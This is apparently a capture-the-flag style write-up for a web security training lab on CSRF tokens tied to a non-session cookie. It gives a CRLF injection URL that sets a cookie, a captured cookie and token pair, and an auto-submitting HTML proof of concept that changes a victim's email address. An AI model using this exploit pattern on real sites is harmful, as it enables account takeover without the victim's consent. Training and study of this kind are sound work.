# Lab: CSRF where token is tied to non-session cookie

- Can set cookie through -> `https://ac0b1fb11ffe2a02c0fd0789002c0073.web-security-academy.net/?search=pwnersec%3b%0d%0aSet-Cookie%3a%20test=test1234`
- Valid `csrfKey` cookie -> `mu4CiMyLRbt2FriL6JMdnR2wycT9c68W`
- Associated `csrf` token -> `9lrPwdDLCMeuQngJvd9P7ZBs9JsAlACu`

- Exploit ->

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
	<img src="https://ac0b1fb11ffe2a02c0fd0789002c0073.web-security-academy.net/?search=pwnersec%3b%0d%0aSet-Cookie%3a%20csrfKey=mu4CiMyLRbt2FriL6JMdnR2wycT9c68W" />
    <form action="https://ac0b1fb11ffe2a02c0fd0789002c0073.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="root&#64;pwnersec&#46;hacks" />
      <input type="hidden" name="csrf" value="9lrPwdDLCMeuQngJvd9P7ZBs9JsAlACu" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

- Email address successfully changed to `root@pwnersec.hacks`.

